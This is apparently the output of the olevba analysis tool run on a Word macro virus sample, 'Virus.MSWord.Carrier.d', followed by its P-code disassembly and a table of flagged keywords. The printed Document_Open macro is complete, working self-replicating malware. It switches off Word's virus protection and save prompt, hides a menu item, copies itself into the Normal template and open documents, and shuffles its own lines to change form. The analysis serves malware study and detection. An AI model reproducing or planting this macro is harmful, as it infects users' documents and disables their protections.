olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Carrier.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Carrier.d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
GoTo 10
20 Options.VirusProtection = False: GoTo 30
10 Application.EnableCancelKey = wdCancelDisabled: GoTo 20
60 Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule: GoTo 70
180 WrittenBy = "Lord_Arz  [SOS] {F#S}": VirusN = "V_Man": Exit Sub
120 If NormInstalled = False Then: Set Infection = NormCarrier: Set Carrier = ActCarrier: GoTo 130: Else: Set Infection = ActCarrier: Set Carrier = NormCarrier: GoTo 130
140 With Carrier: VirCode = .Lines(1, .CountOfLines): End With: GoTo 150
150 With Infection: .DeleteLines 1, Infection.CountOfLines: .InsertLines 1, VirCode: End With: GoTo 160
30 Options.SaveNormalPrompt = False: GoTo 40
110 If NormInstalled = True And ActInstalled = True Then GoTo 180 Else: GoTo 120
170 For i = 4 To IL - 1: RL = Int(Rnd * (IL - 5)) + 4: GCL = Infection.Lines(i, 1): Infection.DeleteLines i, 1: Infection.InsertLines RL, GCL: Next i: GoTo 180
70 NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1): GoTo 80
160 Randomize Timer: GoTo 170
100 If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True: GoTo 110 Else ActInstalled = False: GoTo 110
90 If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True: GoTo 100 Else NormInstalled = False: GoTo 100
80 AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1): GoTo 90
40 Application.CommandBars("Tools").Controls(12).Visible = False: GoTo 50
50 Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule: GoTo 60
130 IL = Carrier.CountOfLines: GoTo 140
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Carrier.d
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11571 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	GoTo 10 
' Line #3:
' 	LineNum 20 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	GoTo 30 
' Line #4:
' 	LineNum 10 
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	GoTo 20 
' Line #5:
' 	LineNum 60 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NormCarrier 
' 	BoS 0x0000 
' 	GoTo 70 
' Line #6:
' 	LineNum 180 
' 	LitStr 0x0015 "Lord_Arz  [SOS] {F#S}"
' 	St WrittenBy 
' 	BoS 0x0000 
' 	LitStr 0x0005 "V_Man"
' 	St VirusN 
' 	BoS 0x0000 
' 	ExitSub 
' Line #7:
' 	LineNum 120 
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Infection 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Carrier 
' 	BoS 0x0000 
' 	GoTo 130 
' 	BoS 0x0000 
' 	Else 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Infection 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Carrier 
' 	BoS 0x0000 
' 	GoTo 130 
' 	EndIf 
' Line #8:
' 	LineNum 140 
' 	StartWithExpr 
' 	Ld Carrier 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemLdWith Lines 0x0002 
' 	St VirCode 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	GoTo 150 
' Line #9:
' 	LineNum 150 
' 	StartWithExpr 
' 	Ld Infection 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld Infection 
' 	MemLd CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld VirCode 
' 	ArgsMemCallWith InsertLines 0x0002 
' 	BoS 0x0000 
' 	EndWith 
' 	BoS 0x0000 
' 	GoTo 160 
' Line #10:
' 	LineNum 30 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	GoTo 40 
' Line #11:
' 	LineNum 110 
' 	Ld NormInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActInstalled 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo 180 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	GoTo 120 
' 	EndIf 
' Line #12:
' 	LineNum 170 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0004 
' 	Ld IL 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	Ld IL 
' 	LitDI2 0x0005 
' 	Sub 
' 	Paren 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0004 
' 	Add 
' 	St RL 
' 	BoS 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Infection 
' 	ArgsMemLd Lines 0x0002 
' 	St GCL 
' 	BoS 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld Infection 
' 	ArgsMemCall DeleteLines 0x0002 
' 	BoS 0x0000 
' 	Ld RL 
' 	Ld GCL 
' 	Ld Infection 
' 	ArgsMemCall InsertLines 0x0002 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	GoTo 180 
' Line #13:
' 	LineNum 70 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St NI 
' 	BoS 0x0000 
' 	GoTo 80 
' Line #14:
' 	LineNum 160 
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' 	BoS 0x0000 
' 	GoTo 170 
' Line #15:
' 	LineNum 100 
' 	Ld AI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "ON ERROR RESUME NEXT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActInstalled 
' 	BoS 0x0000 
' 	GoTo 110 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St ActInstalled 
' 	BoS 0x0000 
' 	GoTo 110 
' 	EndIf 
' Line #16:
' 	LineNum 90 
' 	Ld NI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "ON ERROR RESUME NEXT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstalled 
' 	BoS 0x0000 
' 	GoTo 100 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St NormInstalled 
' 	BoS 0x0000 
' 	GoTo 100 
' 	EndIf 
' Line #17:
' 	LineNum 80 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St AI 
' 	BoS 0x0000 
' 	GoTo 90 
' Line #18:
' 	LineNum 40 
' 	LitVarSpecial (False)
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' 	BoS 0x0000 
' 	GoTo 50 
' Line #19:
' 	LineNum 50 
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ActCarrier 
' 	BoS 0x0000 
' 	GoTo 60 
' Line #20:
' 	LineNum 130 
' 	Ld Carrier 
' 	MemLd CountOfLines 
' 	St IL 
' 	BoS 0x0000 
' 	GoTo 140 
' Line #21:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

